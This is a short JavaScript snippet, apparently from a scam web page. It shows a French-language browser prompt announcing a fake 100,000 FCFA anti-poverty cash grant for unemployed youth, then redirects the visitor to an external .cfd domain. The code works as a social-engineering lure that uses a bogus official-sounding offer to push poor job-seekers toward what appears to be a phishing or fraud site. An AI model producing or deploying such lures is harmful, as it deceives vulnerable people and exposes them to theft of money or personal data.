var password = '100,000 FCFA';

password = prompt(
  'Félicitations, vous êtes éligible pour recevoir la SUBVENTION EN ESPÈCES DE 100,000 FCFA POUR LA LUTTE CONTRE LA PAUVRETÉ DESTINÉE AUX JEUNES SANS EMPLOI. Cliquez sur OK pour recevoir instantanément.',
  '100,000 FCFA'
);

if (password !== '100,000 FCFA') {
    location.href = 'https://ongoing-grant.cfd/100000-Autonomisation-Des-Jeunes.html';
}
